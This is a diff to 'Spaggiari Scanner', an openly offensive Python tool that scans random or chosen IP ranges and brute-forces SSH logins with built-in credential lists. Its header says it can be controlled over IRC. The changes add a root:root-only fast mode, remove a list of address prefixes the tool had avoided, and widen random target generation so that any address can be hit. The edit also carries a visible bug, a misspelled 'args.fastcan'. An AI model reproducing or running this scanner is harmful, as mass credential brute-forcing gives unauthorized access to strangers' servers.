@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 # Spaggiari Scanner
-# A Secure Shell (SSH) scanner / bruteforcer that can be controlled via the Internet Relay Chat (IRC) protocol.
+# A Secure Shell (SSH) scanner / bruteforcer that can be controlled via IRC.
 # Developed by acidvegas in Python 2 & 3
 # https://github.com/acidvegas/spaggiari/
 # spaggiari.py
@@ -31,7 +31,8 @@ Requirments:
  
 Usage: spaggiari.py [OPTIONS] [SCAN]
     OPTIONS
-        -d                 | Enable deep scanning.
+        -d                 | Enable deep scanning. (only used with -t)
+        -f                 | Enable fast scanning. (checks root:root only)
         -o <path>          | Save output from scan(s) to file.
     SCAN
         -l <path>          | Scan a list of ip addresses from file.
@@ -47,7 +48,7 @@ Examples:
     spaggiari.py -r b 192.168   (Scans the range 192.168.0.0-192.168.255.255)
     spaggiari.py -r c 192.168.1 (Scans the range 192.168.1.0-192.168.1.255)
     spaggiari.py -r b random    (Scans the range ?.?.0.0-?.?.255.255)
-    spaggiari.py -r c random    (Scans the range ?.?.?.0-?.?./.255)
+    spaggiari.py -r c random    (Scans the range ?.?.?.0-?.?.?.255)
 """
 
 import argparse
@@ -59,14 +60,13 @@ import socket
 import sys
 import threading
 import time
-import urllib.request
 from collections import OrderedDict
 
 # Throttle Settings
 max_threads     = 100
 throttle        = 20
-timeout_breaker = 5
-timeout_port    = 1
+timeout_breaker = 3
+timeout_port    = 3
 timeout_ssh     = 10.0
 
 # SSH Login Combos
@@ -99,7 +99,6 @@ deep_combos = OrderedDict([
 ])
 
 # Important Ranges (DO NOT EDIT)
-spooky   = ('11','21','22','24','25','26','29','49','50','55','62','64','128','129','130','131','132','134','136','137','138','139','140','143','144','146','147','148','150','152','153','155','156','157','158','159','161','162','163','164','167','168','169','194','195','199','203','204','205','207','208','209','212','213','216','217','6','7')
 reserved = ('0','10','100.64','100.65','100.66','100.67','100.68','100.69','100.70','100.71','100.72','100.73','100.74','100.75','100.76','100.77','100.78','100.79','100.80','100.81','100.82','100.83','100.84','100.85','100.86','100.87','100.88','100.89','100.90','100.91','100.92','100.93','100.94','100.95','100.96','100.97','100.98','100.99','100.100','100.101','100.102','100.103','100.104','100.105','100.106','100.107','100.108','100.109','100.110','100.111','100.112','100.113','100.114','100.115','100.116','100.117','100.118','100.119','100.120','100.121','100.122','100.123','100.124','100.125','100.126','100.127','127','169.254','172.16','172.17','172.18','172.19','172.20','172.21','172.22','172.23','172.24','172.25','172.26','172.27','172.28','172.29','172.30','172.31','172.32','192.0.0','192.0.2','192.88.99','192.168','198.18','198.19','198.51.100','203.0.113','224','225','226','227','228','229','230','231','232','233','234','235','236','237','238','239','240','241','242','243','244','245','246','247','248','249','250','251','252','253','254','255')
 
 def check_ip(ip):
@@ -108,10 +107,8 @@ def check_ip(ip):
 def check_port(ip, port):
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.settimeout(timeout_port)
-    try:
-        code = sock.connect((ip, port))
-    except socket.error:
-        return False
+    try                 : code = sock.connect((ip, port))
+    except socket.error : return False
     else:
         if not code  : return True
         else         : return False
@@ -119,10 +116,10 @@ def check_port(ip, port):
         sock.close()
 
 def check_range(targets):
-    found   = False
+    found = False
     for ip in targets:
         if found : break
-        for bad_range in spooky + reserved:
+        for bad_range in reserved:
             if ip.startswith(bad_range + '.'):
                 found = True
                 break
@@ -148,20 +145,19 @@ def random_int(min, max):
     return random.randint(min, max)
 
 def random_ip():
-    return '%s.%s.%s.%s' % (random_int(1,223), random_int(0,255), random_int(0,255), random_int(0,255))
+    return '%s.%s.%s.%s' % (random_int(0,255), random_int(0,255), random_int(0,255), random_int(0,255))
 
 def random_scan():
     while True:
         ip = (random_ip(),)
         if not check_range(ip):
-            threading.Thread(target=ssh_bruteforce, args=(ip)).start()
+            threading.Thread(target=ssh_bruteforce, args=(ip[0])).start()
         while threading.activeCount() >= max_threads:
             time.sleep(1)
 
 def range_scan(ip_range):
     for ip in ip_range:
         threading.Thread(target=ssh_bruteforce, args=(ip)).start()
-        ip_range.remove(ip)
         while threading.activeCount() >= max_threads:
             time.sleep(1)
     while threading.activeCount() >= 2:
@@ -236,6 +232,7 @@ else:
     paramiko.util.log_to_file('/dev/null')
 parser = argparse.ArgumentParser(prog='spaggiari.py', usage='%(prog)s [OPTIONS] [SCAN]')
 parser.add_argument('-d', action='store_true', dest='deepscan', help='option: enable deep scanning.')
+parser.add_argument('-f', action='store_true', dest='fastscan', help='option: enable fast scanning.')
 parser.add_argument('-o', dest='output', help='option: save output from scan(s) to file.', metavar='<path>', type=str)
 parser.add_argument('-l', dest='listscan', help='scan a list of ip addresses from file.', metavar='<path>', type=str)
 parser.add_argument('-x', action='store_true', dest='randscan', help='scan random ip addresses.')
@@ -243,7 +240,18 @@ parser.add_argument('-r', dest='rangescan', help='scan a range of ip addresses.'
 parser.add_argument('-t', dest='targetscan', help='scan a target ip address.', metavar='<ip>', type=str)
 args = parser.parse_args()
 if args.deepscan:
-    combos = combos + deep_combos
+    if not args.targetscan:
+        logging.critical('Deep scanning can only be enabled with a target scan. (-t)')
+        sys.exit()
+    elif args.fastscan:
+        logging.critical('Fast scanning can not be enabled with a deep scan. (-f)')
+        sys.exit()
+    else:
+        combos = combos + deep_combos
+elif args.fastcan:
+    if args.targetscan:
+        logging.critical('Fast scanning can not be enabled with a target scan.')
+    combos = {'root':'root', }
 if args.output:
     file_handler = logging.FileHandler(args.output)
     file_handler.setLevel(logging.DEBUG)
@@ -252,15 +260,19 @@ if args.output:
     logger.debug('Logging enabled.')
 if args.listscan:
     if os.path.isfile(args.listscan):
+        targets = []
         with open(args.listscan) as list_file:
-            targets = [x for x in list_file.read().splitlines() if check_ip(x)]
+            lines = list_file.read().splitlines()
+            for line in [x for x in lines if x]:
+                if check_ip(line):
+                    targets.append(line)
         if targets:
             if not check_range(targets):
                 logging.debug('Scanning %s IP addresses from list...', '{:,}'.format(len(targets)))
                 range_scan(targets)
                 logging.debug('Scan has completed.')
             else:
-                logging.error('Spooky/Reserved IP address in range.')
+                logging.error('Reserved IP address in range.')
         else:
             logging.error('List contains no valid IP addresses.')
     else:
@@ -287,7 +299,7 @@ elif args.rangescan:
                 range_scan(targets)
                 logging.debug('Scan has completed.')
             else:
-                logging.error('Spooky/Reserved IP address in range.')
+                logging.error('Reserved IP address in range.')
         else:
             logging.error('Invalid IP range prefix. (%s)', args.rangescan[1])
     else:
